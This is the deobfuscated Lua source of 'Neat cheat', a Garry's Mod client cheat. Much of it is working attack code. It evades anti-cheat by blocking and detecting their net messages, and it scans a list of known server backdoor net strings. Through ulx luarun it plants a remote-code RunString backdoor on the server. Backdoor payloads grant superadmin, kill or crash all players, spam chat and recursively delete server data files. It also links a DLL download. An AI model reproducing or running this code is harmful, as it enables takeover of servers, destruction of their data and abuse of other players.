// note by paradox: shitty obfuscation fixed. obfuscating public code is retarded. 
// maybe a little bit shit but I fixed the minifier with glualint.


local function ValidNetString(str)
    return isstring(str) and util.NetworkStringToID(str) ~= 0 and str ~= ""
end

hook.Add('Think', 'детектсуки)', function()
    local a = _G.net.Start
    net.Start = function(b)
        if b == "HasPlyExploit" or b == "SHChk" or b == "nw.readstream" or b == "eacsetting" or b == "eacclsetting" or b == "eaclogs" or b == "Exploit_Detect" or b == "BD_Detect" or b == "Lua_Detect" or b == "External_Detect" or b == "id" or b == "path" or b == "dataserva" or b == "readfile" or b == "fileReaded" or b == "Refresher" or b == "dataigroka" or b == "victimIDandPly" or b == "SearchPlayerPath" or b == "victimpath" or b == "newpathD" or b == "PlayerSpizdin" or b == "GiveMeText" or b == "FileFromJertva" or b == "TheEnd" or b == "Makson_file" or b == "Makson_grab" or b == "Ping1" or b == "Ping2" or b == "checksum" or b == "gcontrolled_vars" or b == "controlled_vars" or b == "quack" or b == "ban_me" or b == "kick_player" or b == "ban_player" or b == "scr1Request" or b == "Startscr1" or b == "scr1InitCallback" or b == "scr1Confirmation" or b == "scr1SendPart" or b == "SendPartBack" or b == "scr1Finished" or b == "rtxappend" or b == "rtxappend2" or b == "Progress" or b == "scr1Interrupted" or b == "miniebobo" or b == "antiebobo" or b == "anti_exploits_ban" or b == "anti_cheat_ban" or b == "anti_dll_ban" or b == "anti_lua_ban" or b == "anti_scripthook_ban" or b == "anti_armdupe_ban" or b == "OpenSimple" or b == "SRequest" or b == "GScreen⁬‎​⁪⁯⁭⁬‪⁯" or b == "SScreen" or b == "SAdmin" or b == "InformPlayer" or b == "InformPlayer2" then
            return false
        else
            return a(b)
        end
    end
end)

local vgui, surface, Color, hook, pairs, string, timer, file, util, math, pcall, RunString, CreateClientConVar, http = vgui, surface, Color, hook, pairs, string, timer, file, util, math, pcall, RunString, CreateClientConVar, http;

local d = {"Fix_Keypads", "Remove_Exploiters", "noclipcloakaesp_chat_text", "insid3", "OdiumBackDoor", "zilnix", "awarn_remove", "_Defqon", "PlayerCheck", "ReadPing", "AntiPK", "jesuslebg", "Sbox_itemstore", "elfamosabackdoormdr", "web", "sv", "YukiBackdoor", "PlayerItemPickUp", "YukiExploit", "echangeinfo", "noprop", "_Warns", "arivia", "jesuslebgzilnix", "ULogs_B", "FredSy", "aiidenbd", "Booter24000", "l_bd_v2", "_reading_darkrp", "exec_remote_apps", "PRDW_GET", "loona_", "billys_logs", "gethacked", "roskov", "KFC", "sogood", "69", "outdated", "netStart", "killer", "Fireflygaming", "Yope", "88Trigerring", "Utopia", "Slasher", "Private", "stickman", "elfamoso", "citizenhack", "nothing", "teamfrench", "Private_14391035", "empereur", "hugs", "snte", "lokidev", "earth", "Abcdefgh", "blind", "SHADoW'S", "hell", "nostraall", "TheNostra", "troll", "Cyan", "_da_", "Silent", "Skeletons", "vald", "fake", "hopper", "0x13", "fixsubmit", "vladmir", "_Cyka", "piks", "reaper", "ULogs_Info", "nolag", "Ulib_Message", "memeDoor", "SessionBackdoor", "DarkRP_AdminWeapons", "stil", "nw.readstream", "Sandbox_Armdupe", "Sbox_darkrp", "ULX_QUERY2", "thereaper", "LickMeOut", "MoonMan", "Im_SOCool", "enablevac", "disablebackdoor", "bFEphMl6IP", "_Raze", "m9k_explosive", "kill", "pjHabrp9EY", "ULXQUERY2", "jeveuttonrconleul", "Sbox_gm_attackofnullday_key", "aze46aez67z67z64dcv4bt", "arcphone_see_reception", "blacksmurfBackdoor", "Reupload", "nostrip", "g", "memrkrieter", "fix", "oldNetReadData", "_CAC_ReadMemory", "nocheat", "Sandbox_GayParty", "DarkRP_UTF8", "BackDoor", "cucked", "NoNerks", "kek", "ZimbaBackDoor", "something", "random", "strip0", "fellosnake", "c", "idk", "killserver", "fuckserver", "cvaraccess", "rcon", "rconadmin", "zilnix", "DefqonBackdoor", "striphelper", "m9k_explosive", "GaySploitBackdoor", "_GaySploit", "slua", "Bilboard.adverts:Spawn(false)", "BOOST_FPS", "FPP_AntiStrip", "ULX_QUERY_TEST2", "FADMIN_ANTICRASH", "ULX_ANTI_BACKDOOR", "UKT_MOMOS", "rcivluz", "SENDTEST", "_clientcvars", "_main", "GMOD_NETDBG", "thereaper", "audisquad_lua", "anticrash", "ZernaxBackdoor", "bdsm", "waoz", "stream", "adm_network", "antiexploit", "ReadPing", "berettabest", "BerettaBest", "negativedlebest", "g", "PlayerCheck", "cac", "zalupa", "Garry's Mod", "The_DankWhy", "dll", "ITEM", "R8", "NEAT"}

file.CreateDir("Neat_cheat")
if file.Read("Neat_cheat/NEAT_lang.txt", "DATA") == "ru" then na_servere_naiden_anti_cheat = "на сервере найден" end

if file.Read("Neat_cheat/NEAT_lang.txt", "DATA") == "en" then na_servere_naiden_anti_cheat = "detected" end

if not file.Exists("Neat_cheat/NEAT_set_spam_text.txt", "DATA") then file.Write("Neat_cheat/NEAT_set_spam_text.txt", "спам текст") end

if not file.Exists("Neat_cheat/NEAT_open_menu.txt", "DATA") then file.Write("Neat_cheat/NEAT_open_menu.txt", "72") end

if not file.Exists("Neat_cheat/NEAT_psina_golos.txt", "DATA") then file.Write("Neat_cheat/NEAT_psina_golos.txt", "jane") end

if not file.Exists("Neat_cheat/NEAT_lang.txt", "DATA") then file.Write("Neat_cheat/NEAT_lang.txt", "en") end

if not file.Exists("Neat_cheat/NEAT_netdamdani.txt", "DATA") then file.Write("Neat_cheat/NEAT_netdamdani.txt", "0") end

NEAT_v = "a.7"

if file.Read("Neat_cheat/NEAT_lang.txt", "DATA") == "en" then
    Ispoliziatsa = "Setect:"
    Welcome = "Welcome in Neat cheat. Version: " .. NEAT_v .. "."
    Preduprejdenie = "Cheat is intended only for DarkRP, possible incorrect operation."
    LastMan = "Last start"
    Options = "Options"
    BServers = "Servers with backdoors"
    ChatCleared = "Chat cleared"
    ClearChat = "Clear chat"
    Enable = "Enabled"
    Disable = "Disabled"
    VoiceEnable = "Enable/Disable voice"
    CheatButton = "This button in the development"
    Voice = "Voice"
    Reset = "Reset settings"
    CheatOpenButton = "Button to open menu"
    LanguageSwitch = "Language"
    HelpAim = "Help in aiming"
    HelpAimButton = "Aiming at <F>"
    TriggerBot = "Trigger Bot"
    AllEntity = "All"
    AllDelete = "Delete all"
    DownloadAddons = "Download clientside addons"
    LoadAddon = "Downloading addon in "
    ClientFly = "Clientside Fly"
    YouTube = "YouTube TV"
    TV = "TV"
    Up = "Up"
    Down = "Down"
    Left = "Left"
    Right = "Right"
    Start = "Start"
    Stop = "Stop"
    Radar = "Radar"
    Highlight = "Highlight players"
    RemWalls = "Remove walls"
    Aim = "crossacer"
    FPS = "fix fps"
    PlayerColor = "Change player colors"
    RunCLCode = "Run clientside code"
    MuteAll = "Mute all"
    TPV = "Third person view"
    TopV = "Top view"
    FakeMoney = "Fake money"
    FakeHack = "Fake Hack"
    HighlightProps = "Highlight props"
    AdminList = "List of admins"
    Spam = "Spam in chat"
    FlashSpam = "Flashlight spam"
    SpamError = "Spam errors"
    Exploits = "Exploits"
    SuperBackdoor = "Super backdoor"
    Backdoors = "Backdoors"
    ClBackdoor = "Client backdoor"
    AAFK = "Anti anti-AFK protection"
    CheckMurder = "Find the murder"
    EnterMoney = "Enter amount of money"
    NickN = "Nickname"
    Group = "Group"
    Wep = "Weapon"
    HP = "Health"
    Dist = "Distance"
    vas_ybil = "You has been killed by"
    vi_ybili = "you killed"
    sec = "sec"
    na_servere_naiden_anti_cheat = "detected"
    not_found_exploits = "not found exploits ):"
    activated_fly_mode = "activated fly mode"
    remove_all = "Remove all"
    Otpravleno = "pasted"
    clearlog = "clear log"
    connect = "Connect"
    disconnect = "Disconnect"
    killdss = "Kills"
    Chat_l = "Chat"
    crashall = "crash all"
    instaled_sv_cheat_odin = "Installed sv_cheats 1 for client, put the gallery r_drawothermodels 2."
    ystanovitedll = "Install the dll in lua/bin download:https://anonfile.com/W56dv3j3b1/bin_rar"
    stedia = "Watch:"
    pornzvyki = "porn sounds of footsteps"
    zdelatvsemscreen = "Make all screen"
    killall = "kill all"
    NEATdisco = "NEAT disco"
    deletedata = "delete data"
    slomatfizika = "Break the physics"
    statistika_4ita = "launch statistics"
end

if file.Read("Neat_cheat/NEAT_lang.txt", "DATA") == "ru" then
    Ispoliziatsa = "Используется:"
    Welcome = "Добро пожаловать в чит Neat " .. NEAT_v .. "."
    Preduprejdenie = "Чит предназначен только для DarkRP, возможна некорректная работа."
    LastMan = "Последний запуск"
    Options = "Настройки"
    BServers = "Сервера с бекдурами"
    ChatCleared = "Чат очищен"
    ClearChat = "Очистить чат"
    Enable = "Включено"
    Disable = "Выключено"
    VoiceEnable = "Вкл/Выкл голос"
    CheatButton = "Эта кнопка в разработке"
    Voice = "Голос"
    Reset = "Сбросить настройки"
    CheatOpenButton = "Кнопка на открытие чита"
    LanguageSwitch = "Язык"
    HelpAim = "Помощь в прицеливании"
    HelpAimButton = "Прицеливание на <F>"
    TriggerBot = "Триггер бот"
    AllEntity = "Все"
    AllDelete = "Удалить все"
    DownloadAddons = "Загрузка клиентских аддонов"
    LoadAddon = "Загрузка аддона в "
    ClientFly = "Клиентский полет"
    YouTube = "Ютуб"
    TV = "Телевизор"
    Up = "Вверх"
    Down = "Вниз"
    Left = "Влево"
    Right = "Вправо"
    Start = "Старт"
    Stop = "Стоп"
    Radar = "Радар"
    Highlight = "Подсветить игроков"
    RemWalls = "Убрать стены"
    Aim = "Прицел"
    FPS = "Повысить ФПС"
    PlayerColor = "Изменить цвета игроков"
    RunCLCode = "Запуск клиентского кода"
    MuteAll = "Замутить всех"
    TPV = "Вид от третьего лица"
    TopV = "Вид сверху"
    FakeMoney = "Фейковые деньги"
    FakeHack = "Фейковый взлом"
    HighlightProps = "Подсветить пропы"
    AdminList = "Список админов"
    Spam = "Спамить в чат"
    FlashSpam = "Спамить фонариком"
    SpamError = "Спамить ошибками"
    Exploits = "Эксплоиты"
    SuperBackdoor = "Супер бекдур"
    Backdoors = "Бекдуры"
    ClBackdoor = "Клиентский бекдур"
    statistika_4ita = "Статистика запуска"
    AAFK = "Анти анти-АФК защита"
    CheckMurder = "Найти убийцу"
    EnterMoney = "Введите количество денег"
    NickN = "Ник"
    Group = "Группа"
    Wep = "Оружие"
    HP = "Жизни"
    Dist = "Дистанция"
    SB1 = "Superbackdoor - Использует все net сообщения"
    SB2 = "если на сервере есть любой бекдур которого"
    SB3 = "нету в базе,гг,вас может забанить,крашнуть)"
    vas_ybil = "Вас убил"
    vi_ybili = "Вы убили"
    sec = "сек"
    na_servere_naiden_anti_cheat = "На сервере найден"
    not_found_exploits = "Ненайдено неодного экспилойта ):"
    activated_fly_mode = "активирован режим полета"
    remove_all = "Удалить все"
    Otpravleno = "отправлено"
    clearlog = "очистить логи"
    connect = "Подключения"
    disconnect = "Отключения"
    killdss = "Убийства"
    Chat_l = "Чат"
    crashall = "Крашуть всех"
    instaled_sv_cheat_odin = "Установлен sv_cheats 1 для client,поставте штоль r_drawothermodels 2."
    ystanovitedll = "Установите dll в lua/bin download:https://anonfile.com/W56dv3j3b1/bin_rar"
    stedia = "Следят:"
    pornzvyki = "порно звуки шагов"
    zdelatvsemscreen = "Зделать всем скрин"
    killall = "Убить всех"
    NEATdisco = "Лимон диско"
    deletedata = "Дата удалить"
    slomatfizika = "Сломать физику"
end

CreateClientConVar("time_l", "1", true, false)
NEAT_time_over = GetConVarNumber("time_l")
timer.Create("timer_time", 1, 0, function()
    NEAT_time_over = NEAT_time_over + 1
    LocalPlayer():ConCommand("time_l " .. NEAT_time_over)
end)

NEAT_menu_color = Color(40, 120, 200)
local function e(g)
    chat.AddText(NEAT_menu_color, "[", "Neat", "] ", Color(0, 255, 0), g)
end

local function h(g)
    chat.AddText(NEAT_menu_color, "[", "Neat", "] ", Color(0, 255, 0), g)
end

local function i(g)
    chat.AddText(NEAT_menu_color, "[", "Neat", "] ", Color(255, 0, 0), g)
end

if _G.Props_3 or _G.PropWhiteList then e(na_servere_naiden_anti_cheat .. " spawnprops!") end
if MOTDgd then
    e(na_servere_naiden_anti_cheat .. " MOTDgd")
    function MOTDgd.GetIfSkip()
        return true
    end
end

if ValidNetString("SwiftAC_aysent") then i(na_servere_naiden_anti_cheat .. " SwiftAC") end
if CAC then i(na_servere_naiden_anti_cheat .. " Cake!") end
if ValidNetString("Umbrella_UpdateSpammers") then e(na_servere_naiden_anti_cheat .. " Umbrella.") end
if ValidNetString("validation_check") then i(na_servere_naiden_anti_cheat .. " G секюрити.") end
if ValidNetString("Watchdog_FoundFragment") then i(na_servere_naiden_anti_cheat .. " Watchdog.") end
if ValidNetString("_AC_LOG") then i(na_servere_naiden_anti_cheat .. " anti cheat.[1]") end
if ValidNetString("eacsetting") then e(na_servere_naiden_anti_cheat .. " EquitableAC") end
if ValidNetString("dataigroka") then h(na_servere_naiden_anti_cheat .. " iseeyou") end
if ValidNetString("backup_data_transfer") then h(na_servere_naiden_anti_cheat .. " modern") end
if ValidNetString("Makson_file") then h(na_servere_naiden_anti_cheat .. " Makson file") end
if ValidNetString("Makson_grab") then h(na_servere_naiden_anti_cheat .. " Makson grab") end
if ValidNetString("quack") then e(na_servere_naiden_anti_cheat .. " qac") end
if ValidNetString("NEAT_kick") then
    e(na_servere_naiden_anti_cheat .. " NEAT anticheat")
    for j = 1, 345345 do
        timer.Remove("34535354345" .. j)
    end
end

if ValidNetString("validate_crc") then e(na_servere_naiden_anti_cheat .. " minimal") end
if ValidNetString("scr1Request") then h(na_servere_naiden_anti_cheat .. " screengrab") end
if ValidNetString("shtirlitz_detection") then e(na_servere_naiden_anti_cheat .. " Shtirlitz Anti-Cheat") end
if ValidNetString("antiebobo") then e(na_servere_naiden_anti_cheat .. " anti cheat urbanickha.") end
if ValidNetString("anti_scripthook_ban") then e(na_servere_naiden_anti_cheat .. " Anti-Sy4ka") end
if ValidNetString("VelocityKillerMessage") then i(na_servere_naiden_anti_cheat .. " VelocityKiller") end
if ValidNetString("GScreen⁬‎​⁪⁯⁭⁬‪⁯") then e(na_servere_naiden_anti_cheat .. " SimpleGrab.") end
chat.AddText(Color(40, 120, 200), "[", "Neat", "] ", Color(255, 255, 255), Welcome)
Lemos_log_kills = ""
Lemos_log_connect = ""
Lemos_log_chat = ""
Lemos_log_disconnect = ""
CreateClientConVar("_menu_r", "40", true, false)
CreateClientConVar("_menu_g", "120", true, false)
CreateClientConVar("_menu_b", "200", true, false)
NEAT_menu_color = Color(40, 120, 200)
NEAT_menu_colorgg = Color(GetConVarNumber("_menu_r"), GetConVarNumber("_menu_g"), GetConVarNumber("_menu_b"))
if not file.Exists("Neat_cheat/NEAT_set_psina.txt", "DATA") then file.Write("Neat_cheat/NEAT_set_psina.txt", "1") end
local function k()
    if NEAT_golosovaia_psina then
        NEAT_golosovaia_psina = not NEAT_golosovaia_psina
        file.Write("Neat_cheat/NEAT_set_psina.txt", "0")
        Notify(Disable)
    else
        NEAT_golosovaia_psina = not NEAT_golosovaia_psina
        file.Write("Neat_cheat/NEAT_set_psina.txt", "1")
        Notify(Enable)
    end
end

surface.CreateFont("Roboto", {
    font = "Roboto",
    size = 18
})

surface.CreateFont("Calibri-l", {
    font = "Calibri",
    size = 18
})

for l = 0, 15 do
    local m = 10 + l
    surface.CreateFont("NEAT_" .. m, {
        font = "Arial",
        size = m
    })
end

surface.CreateFont("exitmenu", {
    font = "Arial",
    size = 20,
    weight = 1000,
    shadow = false,
    outline = false
})

hook.Remove("SpawnMenuOpen", "blockmenutabs")
hook.Remove("HUDPaint", "Draw_NLR_Circle")
hook.Remove("SpawnMenuOpen", "Tsoyvsikarus")
local n = LocalPlayer()
local function o(p)
    if not p == n and p:Alive() and p:IsValid() then
        return true
    else
        return false
    end
end

function urlencode(q)
    if q then
        q = string.gsub(q, "\n", "\r\n")
        q = string.gsub(q, "([^%w ])", function(c) return string.format("%%%02X", string.byte(c)) end)
        q = string.gsub(q, " ", "+")
    end
    return q
end

function Notify(g)
    if file.Read("Neat_cheat/NEAT_set_psina.txt", "DATA") == "1" then sound.PlayURL("http://tts.voicetech.yandex.net/tts?format=mp3&quality=hi&platform=web&application=translate&lang=ru_RU&speaker=" .. file.Read("Neat_cheat/NEAT_psina_golos.txt", "DATA") .. "&emotion=neutral&text=" .. urlencode(g), "mono", function() end) end
    local r = vgui.Create("DPanel")
    r:SetSize(200, 50)
    r:SetPos(ScrW() - 200, -50)
    r.Paint = function(self, t, u)
        draw.RoundedBox(0, 0, 0, t, u, Color(30, 30, 30))
        local v = 50
        for l = 0, v do
            local w = HSVToColor(CurTime() % 6 * 60 + l, 1, 1)
            draw.RoundedBox(0, l * t / v, r:GetTall() - 2, t / v, 3, Color(l + 1 * w.r, l + 1 * w.g, l + 1 * w.b, 255))
        end

        draw.SimpleText(g, "Calibri-l", r:GetWide() / 2, r:GetTall() / 2, Color(255, 255, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
    end

    r:MoveTo(ScrW() - r:GetWide(), 0, .2, 0, -1, function() timer.Simple(3, function() r:MoveTo(ScrW() - r:GetWide(), -50, .2, 0, -1) end) end)
end

hook.Add("HUDPaint", "я", function()
    fgdf = 100
    for x, p in pairs(player.GetAll()) do
        if p:GetObserverTarget() and not p == LocalPlayer() and p:GetObserverTarget() == LocalPlayer() then
            draw.SimpleText(stedia, "NEAT_20", 100, 80, Color(255, 214, 41), 1)
            draw.SimpleText(p:Nick(), "NEAT_20", 100, fgdf, Color(255, 214, 41), 1)
            fgdf = fgdf + 20
        end
    end
end)

function ECNotify()
end

local function y()
    for z = 1, 100 do
        LocalPlayer():ChatPrint("")
    end

    Notify(ChatCleared)
end

local function h(g)
    chat.AddText(NEAT_menu_color, "[", "Neat", "] ", Color(255, 255, 255), g)
end

local function e(g)
    chat.AddText(NEAT_menu_color, "[", "Neat", "] ", Color(0, 255, 0), g)
end

local function i(g)
    chat.AddText(NEAT_menu_color, "[", "Neat", "] ", Color(255, 0, 0), g)
end

local A = false
function L_thirdperson()
    if vgui.CursorVisible() then return end
    A = not A
end

net.Receive("sv_togglethirdperson")
function CalcThirdperson(n, pos, B, C)
    if A then
        local D = {}
        local E = 100
        local F = {}
        F.start = pos
        F.endpos = pos - B:Forward() * E
        F.filter = LocalPlayer()
        local F = util.TraceLine(F)
        if F.HitPos:Distance(pos) < E - 10 then E = F.HitPos:Distance(pos) - 10 end
        D.origin = pos - B:Forward() * E
        D.angles = B
        D.fov = C
        return D
    end
end

hook.Add("CalcView", "CalcThirdperson", CalcThirdperson)
hook.Add("ShouldDrawLocalPlayer", "MyHax ShouldDrawLocalPlayer", function(n) if A then return true end end)
local G = false
hook.Add("Tick", "CheckPlayerKey", function()
    if input.IsKeyDown(KEY_T) and G == false then
        L_thirdperson()
        G = true
        timer.Simple(0.1, function() G = false end)
    end
end)

gameevent.Listen("entity_killed")
hook.Add("entity_killed", "Lemo1s_kills", function(H)
    local I = Entity(H.entindex_attacker)
    local J = Entity(H.entindex_killed)
    if I:IsValid() and J:IsValid() and I:IsPlayer() and J:IsPlayer() then
        if I == J and J ~= LocalPlayer() then
        elseif I == J and J == LocalPlayer() then
        elseif I == LocalPlayer() then
            e(vi_ybili .. " " .. J:Nick() .. ".")
        elseif J == LocalPlayer() then
            i(vas_ybil .. " " .. I:Nick() .. ".")
        else
        end
    end
end)

local function K()
    if NEAT then
        NEAT = not NEAT
        Notify(Enable)
        timer.Destroy("antiafk", 40, 0, function() end)
    else
        NEAT = not NEAT
        Notify(Disable)
        timer.Create("antiafk", 40, 0, function()
            RunConsoleCommand("+forward")
            timer.Create("antiafk1", 0.1, 0, function()
                RunConsoleCommand("-forward")
                timer.Destroy("antiafk1", 0.1, 0, function() end)
            end)
        end)
    end
end

local L = {}
local function M(N)
    if string.sub(N, -4) ~= ".lua" then return end
    include(N)
end

local function O(P, Q, R)
    local S, T = file.Find(Q, "GAME")
    if #T ~= 0 then
        for l = 1, #T do
            L[R] = L[R] .. "/" .. T[l]
            P = O(P, L[R] .. "/*", R)
        end
    end

    table.Add(P, S)
    return P
end

local function U(V)
    V = "addons/" .. V
    e(LoadAddon .. V)
    local j, W = file.Find(V .. "/lua/*", "GAME")
    if #W < 1 then
        L[1] = V .. "/lua"
    else
        for l = 1, #W do
            L[l] = V .. "/lua/" .. W[l]
        end
    end

    local X = V .. "/lua/*"
    local P, Y = file.Find(X, "GAME")
    for l = 1, #Y do
        local Q = Y[l]
        P = O(P, V .. "/lua/" .. Q .. "/*", 1)
    end

    for l = 1, #P do
        for Z = 1, #L do
            local R = L[Z]
            local _ = string.sub(R, string.len(V) + 6, string.len(R))
            M(_ .. "/" .. P[l])
        end
    end

    table.Empty(L)
end

local function a0()
    local j, Y = file.Find("addons/*", "GAME")
    for l = 1, #Y do
        Y[l] = "loadaddon " .. Y[l]
    end
    return Y
end

concommand.Add("loadaddon", function(j, j, a1) U(a1[1]) end, a0)
local a2 = ""
local function a3()
    local j, Y = file.Find("addons/*", "GAME")
    local a4 = vgui.Create("DFrame")
    a4:SetSize(460, 257)
    a4:Center()
    a4:ShowCloseButton(false)
    a4:MakePopup()
    a4:SetVisible(true)
    a4:SetTitle("")
    a4.Paint = function()
        surface.SetDrawColor(90, 90, 90, 255)
        surface.DrawRect(0, 0, a4:GetWide(), a4:GetTall())
        draw.RoundedBox(0, 0, 0, 4, 1000, NEAT_menu_colorgg)
        draw.RoundedBox(0, a4:GetWide() - 4, 0, 4, 1000, NEAT_menu_colorgg)
        draw.RoundedBox(0, 0, a4:GetTall() - 4, 1000, 4, NEAT_menu_colorgg)
        draw.RoundedBox(0, 0, 0, 699, 27, NEAT_menu_colorgg)
        draw.SimpleText("Neat - " .. DownloadAddons, "Roboto", a4:GetWide() / 2 - 8, 13, Color(255, 255, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
    end

    local a5 = vgui.Create("DButton", a4)
    a5:SetText("")
    a5:SetPos(a4:GetWide() - 46, 1)
    a5:SetSize(42, 20)
    a5.DoClick = function() a4:Close() end
    a5.Paint = function(a6, t, u)
        draw.RoundedBox(0, 0, 0, t, u, Color(255, 0, 1, 255))
        draw.SimpleText("х", "Roboto", t / 2, u / 2 - 1, Color(255, 255, 255, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
        if a5.Hovered then draw.RoundedBox(0, 0, 0, t, u, Color(255, 255, 255, 59)) end
    end

    local a7 = vgui.Create("DListView", a4)
    a7:AddColumn("")
    a7:SetMultiSelect(false)
    a7:SetSize(450, 200)
    a7:SetPos(5, 27)
    for l = 1, #Y do
        local Q = Y[l]
        a7:AddLine(Q)
    end

    local a8 = vgui.Create("DButton", a4)
    a8:SetSize(120, 22)
    a8:SetPos(335, 230)
    a8:SetText("")
    a8.Paint = function(a6, t, u)
        draw.RoundedBox(0, 0, 0, t, u, Color(0, 0, 0, 255))
        draw.SimpleText("Load", "Roboto", t / 2, u / 2 - 1, Color(255, 255, 255, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
        if a8.Hovered then draw.RoundedBox(0, 0, 0, t, u, Color(255, 255, 255, 59)) end
    end

    local Text = vgui.Create("DLabel", a4)
    Text:SetPos(10, 230)
    Text:SetText("Addon: ")
    Text:SizeToContents()
    a7.OnClickLine = function(j, a9)
        a2 = a9:GetValue(1)
        Text:SetText("Addon: " .. a2)
        Text:SizeToContents()
    end

    a8.DoClick = function() RunConsoleCommand("loadaddon", a2) end
end

local function aa(f)
    net.Start(NEATbackdoornet)
    net.WriteString(f)
    net.WriteBit(1)
    net.SendToServer()
end

local function ab()
    local ac = vgui.Create("DFrame")
    ac:SetSize(400, 437)
    ac:Center()
    ac:MakePopup()
    ac:ShowCloseButton(false)
    ac:SetTitle("")
    ac.target = LocalPlayer()
    ac.Paint = function()
        surface.SetDrawColor(90, 90, 90, 255)
        surface.DrawRect(0, 0, ac:GetWide(), ac:GetTall())
        draw.RoundedBox(0, 0, 0, 4, 1000, NEAT_menu_colorgg)
        draw.RoundedBox(0, ac:GetWide() - 4, 0, 4, 1000, NEAT_menu_colorgg)
        draw.RoundedBox(0, 0, ac:GetTall() - 4, 1000, 4, NEAT_menu_colorgg)
        draw.RoundedBox(0, 0, 0, 699, 27, NEAT_menu_colorgg)
        draw.SimpleText("Neat - backdoor", "Roboto", ac:GetWide() / 2 - 8, 13, Color(255, 255, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
    end

    local a5 = vgui.Create("DButton", ac)
    a5:SetText("")
    a5:SetPos(ac:GetWide() - 46, 1)
    a5:SetSize(42, 20)
    a5.DoClick = function() ac:Close() end
    a5.Paint = function(a6, t, u)
        draw.RoundedBox(0, 0, 0, t, u, Color(255, 0, 1, 255))
        draw.SimpleText("х", "Roboto", t / 2, u / 2 - 1, Color(255, 255, 255, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
        if a5.Hovered then draw.RoundedBox(0, 0, 0, t, u, Color(255, 255, 255, 59)) end
    end

    local ad = vgui.Create("DScrollPanel", ac)
    ad:SetPos(5, 30)
    ad:SetSize(200, 400)
    function button_add(ae, func)
        local a5 = vgui.Create("DButton", ad)
        a5:SetText("")
        a5:Dock(TOP)
        a5:DockMargin(1, 9, 1, -5)
        a5:DockPadding(2, 22, 2, 22)
        a5.Paint = function(a6, t, u)
            draw.RoundedBox(0, 0, 0, t, u, Color(0, 0, 0, 255))
            draw.SimpleText(ae, "Roboto", t / 2, u / 2 - 1, Color(255, 255, 255, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
            if a5.Hovered then draw.RoundedBox(0, 0, 0, t, u, Color(255, 255, 255, 59)) end
        end

        a5.DoClick = func
    end

    AppList = vgui.Create("DListView", ac)
    AppList:SetPos(210, 30)
    AppList:SetSize(183, 352)
    AppList:SetMultiSelect(true)
    AppList:AddColumn("all")
    AppList.OnClickLine = function(j, a9)
        NEATbackdoornet = a9:GetValue(1)
        h(Ispoliziatsa .. NEATbackdoornet)
    end

    for x, af in pairs(d) do
        if ValidNetString(af) then
            NEATbackdoornet = af
            AppList:AddLine(af)
        end
    end

    local a5 = vgui.Create("DButton", ac)
    a5:SetText("")
    a5:SetPos(210, 410)
    a5:SetSize(183, 22)
    a5.Paint = function(a6, t, u)
        draw.RoundedBox(0, 0, 0, t, u, Color(0, 0, 0, 255))
        draw.SimpleText("inject", "Roboto", t / 2, u / 2 - 1, Color(255, 255, 255, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
        if a5.Hovered then draw.RoundedBox(0, 0, 0, t, u, Color(255, 255, 255, 59)) end
    end

    a5.DoClick = function()
        Notify("inject")
        if ulx then
            RunConsoleCommand("ulx", "logecho", 0)
            timer.Simple(3, function()
                if ValidNetString("NEAT") then
                else
                    RunConsoleCommand("ulx", "luarun", "util.AddNetworkString('NEAT')net.Receive('NEAT',function()RunString(net.ReadString())end)")
                    timer.Create("Lol_33", 5, 0, function() timer.Destroy("Lol_33", 5, 0, function() end) end)
                    timer.Create("Lol_54", 1, 0, function()
                        RunConsoleCommand("ulx", "logecho", 1)
                        timer.Destroy("Lol_54", 1, 0, function() end)
                    end)
                end
            end)

            if ValidNetString("NEAT") then Notify("backdoor") end
        else
            Notify("error not ulx")
        end

        ac:Close()
    end

    local a5 = vgui.Create("DButton", ac)
    a5:SetText("")
    a5:SetPos(210, 383)
    a5:SetSize(183, 22)
    a5.Paint = function(a6, t, u)
        draw.RoundedBox(0, 0, 0, t, u, Color(0, 0, 0, 255))
        draw.SimpleText("", "Roboto", t / 2, u / 2 - 1, Color(255, 255, 255, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
        if a5.Hovered then draw.RoundedBox(0, 0, 0, t, u, Color(255, 255, 255, 59)) end
    end

    a5.DoClick = function() end
    button_add("give superadmin", function() aa([[local id = ]] .. LocalPlayer():UserID() .. [[ RunConsoleCommand( 'ulx', 'adduser', tostring( Player( id ):Nick() ), 'superadmin' ) Player( id ):SetUserGroup( "superadmin" )]]) end)
    button_add("ok", function() aa([[util.AddNetworkString('NEAT')net.Receive('NEAT',function()RunString(net.ReadString())end) for k,v in pairs(player.GetAll()) do v:addMoney(10000000000) end for k,v in pairs(player.GetAll()) do RunConsoleCommand("ulx","adduser",v:Nick(),"vip") end]]) end)
    button_add(pornzvyki, function() aa("hook.Add(\"PlayerFootstep\", \"porn\", function(ply, pos, foot, sound2, volume, filter) ply:EmitSound( \"vo/npc/female01/pain06.wav\",75,math.random( 50, 150 )) end )") end)
    button_add(zdelatvsemscreen, function() aa("BroadcastLua([[RunConsoleCommand('screenshot')]])") end)
    button_add(killall, function() aa("for k,v in pairs(player.GetAll()) do v:Kill() end") end)
    button_add("spam", function()
        Text = {"chat.AddText(Color(math.random(255), math.random(255), math.random(255)), \" █████ HACKED BY Exec#8920 ██████ \")"}
        chatrapemike = not chatrapemike
        if chatrapemike then
            timer.Create("Lol4535", 0.0001, 0, function()
                net.Start(NEATbackdoornet)
                net.WriteString("for k,v in pairs(player.GetAll()) do v:SendLua([[" .. table.Random(Text) .. "]]) end ")
                net.WriteBit(1)
                net.SendToServer()
            end)
        else
            timer.Destroy("Lol4535")
        end
    end)

    button_add(crashall, function() aa("for k,v in pairs(player.GetAll()) do v:SendLua(\"while true do end\") end") end)
    button_add("all supradmin", function() aa([[for k,v in pairs(player.GetAll()) do RunConsoleCommand("ulx","adduser",v:Nick(),"superadmin") end]]) end)
    button_add("2D models", function() aa("") end)
    button_add(deletedata, function() aa([[local function a(b)b=b or""local c,d=file.Find(b.."*",'MOD')for e,f in pairs(c)do local g=string.gsub(b,'data/','')file.Delete(g..f)end;for h,i in pairs(d)do a(b..i..'/')end end;a('data/')]]) end)
